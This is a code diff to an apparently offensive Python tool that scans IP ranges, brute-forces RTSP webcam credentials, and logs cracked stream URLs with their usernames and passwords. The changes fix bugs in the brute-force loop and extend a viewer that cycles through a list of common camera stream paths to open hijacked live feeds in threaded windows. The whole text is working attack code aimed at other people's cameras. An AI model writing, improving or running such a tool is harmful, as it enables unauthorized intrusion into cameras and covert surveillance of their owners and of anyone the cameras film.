@@ -5,8 +5,11 @@ import base64
 import re
 import queue
 import time
+import os
+os.environ["OPENCV_LOG_LEVEL"]="SILENT"
 import cv2
 import sys
+
 from pathlib import Path
 
 about = "bruteforcing webcams by http/https"
@@ -109,6 +112,9 @@ class main(object):
             
             if command[0] == "quit":
                 return 0
+            
+            if command[0] == "clear":
+                os.system("cls||clear")
             
     def module_scan_run(self):
         for ip_range in self.ip_ranges: 
@@ -216,11 +222,12 @@ class RtspBrute(object):
         if path.exists() and path.is_file():
             with open(path, encoding='utf-8', errors='ignore') as file:
                 for line in file:
-                    if method == "":
-                        list.add(line.strip())
-                    elif method == "target":
-                        line = self.vaild_target(line.strip())
-                        list.add(line.strip() + ":" + str(self.port))
+                    if line is not None:
+                        if method == "":
+                            list.add(line.strip())
+                        elif method == "target":
+                            line = self.vaild_target(line.strip())
+                            list.add(line.strip() + ":" + str(self.port))
             return list
         else:
             if method == "":
@@ -270,8 +277,8 @@ class RtspBrute(object):
                                     data = self.rtsp_request(target, username, password)
                                     if data is not None:
                                         if "200 OK" in data:
+                                            res = str("rtsp://{}/av1&user={}&password={}".format(target, username, password))
                                             if res not in file:
-                                                res = str("rtsp://{}/av1&user={}&password={}".format(target, username, password))
                                                 print(res)
                                                 self.brute_result = res
                                                 with open("IpCams_brute_result.txt", "a") as f:
@@ -300,46 +307,102 @@ class RtspBrute(object):
     
 class RTSP_Viewer(object):
     def __init__(self):
+        self.path_list=[
+            "av0",
+            "Streaming/Channels/101",
+            "h264/ch01/main/av_stream",
+            "h264/ch01/sub/av_stream",
+            "live/h264",
+            "&channel=1&stream=0.sdp?",
+            "1",
+            "2",
+            "cam/realmonitor?channel=1&subtype=0",
+            "live/main",
+            "live/sub",
+            "streaming/video0",
+            "streaming/video1"
+        ]
+        self.in_use = False
+        self.kill_threads = False
+        self.last_window = str()
         self.rtsp_list = self.get_rtsp_file()
         self.running = True
     def run(self):
         list_len = len(self.rtsp_list)
         camera_num = 0
+        _video_windows = []
         while self.running:
+            if self.kill_threads:
+                self.kill_threads = False
+                
             try:
-                self.camera_capture(camera_num)
+                win = threading.Thread(target=self.camera_capture ,args=(camera_num, self.rtsp_list, self.path_list))
+                win.start()
+                _video_windows.append(win)
+                self.last_window = str(f'Camera_{camera_num}')
             except Exception as e:
                 print(e.with_traceback(e))
             command = str(input(f"cameras[now {camera_num}]>> ")).split(" ")
             
             if command[0] == "quit":
                 return 0
+            
+            if command[0] == "clear":
+                os.system("cls||clear")
+            
+            if command[0] == "get":
+                camera_num = int(command[1])-1
+                self.kill_threads = True
+            
             if command[0] == "next":
                 camera_num += 1
+                self.kill_threads = True
+                
             if command[0] == "back":
                 camera_num -= 1
+                self.kill_threads = True
+                
             if camera_num == -1:
                 camera_num = list_len
                 
-            if camera_num == list_len+1:
+            if camera_num == list_len:
                 camera_num = 0
             
             
             
     def get_rtsp_file(self):
         with open("./IpCams_brute_result.txt", "r") as f:
-            return f.readline()
+            return f.readlines()
         
-    def camera_capture(self, num):
-        print(f"{num}/{len(self.rtsp_list)}")
-        video = cv2.VideoCapture(self.rtsp_list[num])
-        while True:
+    def camera_capture(self, num, rtsp_list, path_list):
+        path_num = 0
+        print("ESC to close preview", end="\n")
+        print(f"{num+1}/{len(rtsp_list)}", end="\n")
+        video = cv2.VideoCapture(rtsp_list[num])
+        run = True
+        while run and not self.kill_threads:
             ret ,frame = video.read()
-            cv2.imshow("RTSP",frame)
-            k = cv2.waitKey(1)
-            if k == ord("q"):
-                print('exit')
-                break
+            if ret == False:
+                if path_num == len(path_list):
+                    break
+                else:
+                    url = rtsp_list[num].replace("av1",path_list[path_num])
+                    print(f"Trying to connect: {path_num}/{len(path_list)}\n", end="")
+                    try:
+                        video = cv2.VideoCapture(url)
+                    except Exception:
+                        pass
+                    path_num += 1
+            else:
+                if not self.in_use:
+                    self.in_use = True
+                cv2.imshow(f'Camera_{num}', frame)
+                if cv2.waitKey(50) == 27:
+                    run = False
+        print("\n\n")
         video.release()
-        cv2.destroyAllWindows()
+        try:
+            cv2.destroyWindow(f'Camera_{num}')
+        except Exception:
+            print("No Window", end="")
         
